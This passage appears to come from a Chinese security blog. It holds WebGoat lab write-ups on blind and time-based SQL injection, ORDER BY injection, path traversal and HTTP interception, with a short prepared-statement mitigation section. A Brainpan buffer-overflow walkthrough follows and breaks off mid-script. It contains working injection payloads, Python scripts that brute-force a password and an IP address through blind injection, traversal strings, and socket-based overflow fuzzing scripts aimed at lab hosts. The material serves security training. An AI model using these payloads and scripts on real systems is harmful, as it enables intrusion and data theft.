</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * from articles <span class="built_in">where</span> article_id = 4 </span><br><span class="line">SELECT * from articles <span class="built_in">where</span> article_id = 4 AND 1 = 1</span><br></pre></td></tr></table></figure>
<p>如果返回内容相同，则存在盲注</p>
<ul>
<li>利用方法</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2</span><br></pre></td></tr></table></figure>
<p>如果数据库的权限设置正确（意味着无法与用于从Web应用程序连接到数据库的用户查询系统表），则该方法可能不起作用。</p>
<ul>
<li>基于时间的SQL注入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * from articles <span class="built_in">where</span> article_id = 4 ; sleep(10) --</span><br></pre></td></tr></table></figure>
<p>根据响应时间判断是否存在注入</p>
<ul>
<li>判断存在盲注</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#帐户名字符串，为字符串型注入 选用 '1</span></span><br><span class="line">username_reg=tom&amp;email_reg=tom%40tom.com&amp;password_reg=passaa&amp;confirm_password_reg=tom</span><br><span class="line"></span><br><span class="line">username_reg=tom+<span class="string">'+and+1='</span>1&amp;email_reg=tom%40tom.com&amp;password_reg=passaa&amp;confirm_password_reg=tom</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200604230331397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username_reg=tom+<span class="string">'+and+substring(password%2C1%2C1)+%3D+'</span>1&amp;email_reg=tom%40tom.com&amp;password_reg=passaa&amp;confirm_password_reg=tom</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200604231217357.png" alt="在这里插入图片描述"><br>当输入<strong>tom</strong>时，结果为 <strong>already exists</strong><br>当输入<strong>tom ‘and 1=’1</strong>时，结果为<strong>already exists</strong><br>当输入<strong>tom ‘and 1=’2</strong>时，结果为 <strong>tom ‘and 1=’ created</strong><br>可见 and之后结果为true则返回<strong>already exists</strong>为false返回  <strong>created</strong><br>所以<strong>tom ‘ and substring(password,1,1)=’x</strong> 为<strong>already exists</strong>时，x为password字段中的一个元素<br>编写密码爆破代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">chars = printable</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'JSESSIONID'</span>: <span class="string">'GFk1ly1AkBOXoZPNy4LMvs4H_cEW2WS0lUJK5T3r'</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://192.168.80.2:8080/WebGoat/SqlInjectionAdvanced/challenge'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">print(<span class="string">"======start===="</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        data = <span class="string">"username_reg=tom+'+and+substring(password%2C&#123;0&#125;%2C1)%3D'&#123;1&#125;"</span> \</span><br><span class="line">               <span class="string">"&amp;email_reg=passaa%40q&amp;password_reg=passaa&amp;confirm_password_reg=q"</span>.format(i, char)</span><br><span class="line">        respond = requests.put(url=url, headers=headers, cookies=cookies, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'already exists'</span> <span class="keyword">in</span> respond.text:</span><br><span class="line">            res += char</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> tmp == res:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200605202556406.png" alt="在这里插入图片描述"><br>最终得到thisisasecretfortomonly&amp;,但是输入之后无法登陆，发现&amp;起连接作用也可以出现already exists，所以舍弃，最终密码为<strong>thisisasecretfortomonly</strong></p>
<h2 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a>SQL Injection (mitigation)</h2><ul>
<li>防御方法</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用占位符 ？</span></span><br><span class="line">String query = <span class="string">"SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = **?**"</span>;</span><br><span class="line"><span class="comment">#使用静态查询语句</span></span><br><span class="line">PreparedStatement statement = connection.prepareStatement(query);</span><br><span class="line">statement.setString(1, accountID);</span><br><span class="line"><span class="comment">#使用安全带存储过程</span></span><br><span class="line"><span class="comment">#使用白名单验证order by 语句</span></span><br></pre></td></tr></table></figure>

<ul>
<li>java sql防御<img src="https://img-blog.csdnimg.cn/20200605205830372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    Connection ct = <span class="keyword">null</span>; </span><br><span class="line">    ct=DriverManager.getConnection(DBURL,DBUSER,DBPW);</span><br><span class="line">    PreparedStatement ps=ct.prepareStatement(<span class="string">"select * from users where name=?"</span>);</span><br><span class="line">    ps.setString(<span class="number">1</span>,<span class="string">"3"</span>);</span><br><span class="line">    ResultSet rs=ps.executeQuery();    </span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    System.out.println(<span class="string">"123"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>0x09、0x10</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'or<span class="comment">/**/</span>1=1<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020060521274076.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过/**/绕过空格限制，但却返回sorry….</p>
<ul>
<li>order by<br>点击箭头可以进行排序<br><img src="https://img-blog.csdnimg.cn/2020060522191118.png" alt="在这里插入图片描述"><br>使用ip进行排序<br><img src="https://img-blog.csdnimg.cn/20200605222124895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>报错注入得到表名servers，已经查询语句</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, hostname, ip, mac, <span class="keyword">status</span>, description <span class="keyword">from</span> servers  <span class="keyword">where</span> <span class="keyword">status</span> &lt;&gt; <span class="string">'out of order'</span> <span class="keyword">order</span> <span class="keyword">by</span> testa</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020060522230031.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">GET /WebGoat/SqlInjectionMitigations/serverscolumn=case+when(TRUE)+then+ip+else+mac+<span class="keyword">end</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> /WebGoat/SqlInjectionMitigations/servers?<span class="keyword">column</span>=ip <span class="keyword">HTTP</span>/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
<p>两者执行结果相同</p>
<p> case when(true)then a else b end </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#when结果为true 则执行</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, hostname, ip, mac, <span class="keyword">status</span>, description <span class="keyword">from</span> servers  <span class="keyword">where</span> <span class="keyword">status</span> &lt;&gt; <span class="string">'out of order'</span> <span class="keyword">order</span> <span class="keyword">by</span> a</span><br><span class="line"><span class="comment">#when 为false</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, hostname, ip, mac, <span class="keyword">status</span>, description <span class="keyword">from</span> servers  <span class="keyword">where</span> <span class="keyword">status</span> &lt;&gt; <span class="string">'out of order'</span> <span class="keyword">order</span> <span class="keyword">by</span> b</span><br></pre></td></tr></table></figure>
<p>所以可以执行when((select substring(ip,1,1) from servers where hostname=’webgoat-prd’ )=x)来判断x是否为ip的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chars = digits + <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'JSESSIONID'</span>: <span class="string">'tUAGEO6LuXxhFcQJLVW7p2GYf0VgznaI6oCbqfF3'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">print(<span class="string">"======start===="</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        url = <span class="string">"http://192.168.80.2:8080/WebGoat/SqlInjectionMitigations/servers?"</span> \</span><br><span class="line">              <span class="string">"column=case+when((select+substring(ip%2c&#123;0&#125;%2c1)+from+servers+"</span> \</span><br><span class="line">              <span class="string">"where+hostname%3d'webgoat-prd')%3d'&#123;1&#125;')+then+hostname+else+ip+end"</span>.format(i, char)</span><br><span class="line">        respond = requests.get(url=url, headers=headers, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'webgoat-acc'</span> == respond.json()[<span class="number">0</span>][<span class="string">'hostname'</span>]:</span><br><span class="line">            res += char</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">-1</span>] == <span class="string">'.'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>获得104. 由于题目给出130.219.202，拼接得到答案<strong>104.130.219.202</strong></p>
<h2 id="Path-traversal"><a href="#Path-traversal" class="headerlink" title="Path traversal"></a>Path traversal</h2><ul>
<li>文件上传漏洞<br>使用 ../ 或%2e%2e%2f 绕过<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/../../../../../home/webgoat/.webgoat-8.1.0/PathTraversal/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<img src="https://img-blog.csdnimg.cn/20200606195703511.png" alt="在这里插入图片描述"></li>
<li>双重编码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">....//..//..//pass</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200606203623437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>第九题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">../../../.webgoat-8.1.0/PathTraversal/pass</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200606203816615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>第十题<br>抓取show random  cat picture</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200606211204603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2f</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200606211034227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200606211240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成sha512字符串</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"passaa"</span>|openssl dgst -sha512 </span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"passaa"</span>|shasum -a 512</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200606212205591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Webgoat -HTTP</title>
    <url>/2020/08/21/Webgoat%20-HTTP/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull webgoat/goatandwolf</span><br><span class="line">docker run -itd -p 8080:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问网页</span></span><br><span class="line">127.0.0.1:8080/WebGoat</span><br><span class="line">127.0.0.1:9090/WebWolf</span><br></pre></td></tr></table></figure>

<h2 id="HTTP基础"><a href="#HTTP基础" class="headerlink" title="HTTP基础"></a>HTTP基础</h2><p><img src="https://img-blog.csdnimg.cn/20200531204616579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包得到magic number<br><img src="https://img-blog.csdnimg.cn/20200531204641630.png" alt="在这里插入图片描述"><br>修改提交的number为10，发送包<br><img src="https://img-blog.csdnimg.cn/20200531204803897.png" alt="在这里插入图片描述"></p>
<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><p>按要求构造数据包<br><img src="https://img-blog.csdnimg.cn/20200531205408206.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /WebGoat/HttpProxies/intercept-request?changeMe=Requests+are+tampered+easily HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.80.2:8080</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.80.2:8080/WebGoat/start.mvc</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">x-request-intercepted:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: JSESSIONID=FED417914EB38075FF3C78F335500CA2</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200531205454649.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub Brainpan_1</title>
    <url>/2020/08/21/vulhub%20Brainpan_1/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>缓冲区溢出</li>
<li>man 提权</li>
</ul>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530185743745.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p-   --min-rate=1000 192.168.80.6 &gt;ports </span><br><span class="line">ports=$(cat ports | awk -F <span class="string">" "</span> <span class="string">'&#123;print $1&#125;'</span> | awk -F <span class="string">"/"</span> <span class="string">'&#123;print $1&#125;'</span> | sort -n | tr <span class="string">'\n'</span> <span class="string">','</span> | sed <span class="string">'s/[^0-9]*//'</span>)</span><br><span class="line">nmap -sC -sV -T4 -p <span class="variable">$ports</span> 192.168.80.6 -oA nmap/nmap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530190059715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.80.6:10000 -w /usr/share/wordlists/dirb/big.txt -t50  -o dir.out -q </span><br><span class="line"></span><br><span class="line">http://192.168.80.6:10000/bin/</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200530190410863.png" alt="在这里插入图片描述"><br> 下载下来</p>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><ul>
<li><p>模糊测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">2000</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">    s.connect((<span class="string">'192.168.80.100'</span>,<span class="number">9999</span>))</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"send paylaod"</span>)</span><br><span class="line">    s.send(payload)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"connot connect"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200529220237794.png" alt="在这里插入图片描述"><br>可见EIP被A的十六进制（41）覆盖</p>
</li>
<li><p>定位边界</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">payload =<span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"</span></span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">s.connect((<span class="string">'192.168.80.100'</span>,<span class="number">9999</span>))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"send paylaod"</span>)</span><br><span class="line">s.send(payload)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/2020052922111156.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200529221425166.png" alt="在这里插入图片描述"><br>可见边界为524</p>
<ul>
<li><p>确定esp空间大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">600</span></span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">s.connect((<span class="string">'192.168.80.100'</span>,<span class="number">9999</span>))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"send paylaod"</span>)</span><br><span class="line">s.send(payload)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200529221902741.png" alt="在这里插入图片描述"><br>可见EIP被B覆盖，ESP被C覆盖<br><img src="https://img-blog.csdnimg.cn/20200529222039931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>计算后发现存在464空间可以放下shellcode</p>
</li>
<li><p>剔除坏字节</p>
</li>
</ul>
<p>生成十六进制字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    sys.stdout.write(<span class="string">"\\x"</span>+<span class="string">'&#123;:02x&#125;'</span>.format(a))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"connect target"</span>)</span><br><span class="line">s.connect((<span class="string">'192.168.80.100'</span>,<span class="number">9999</span>))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (<span 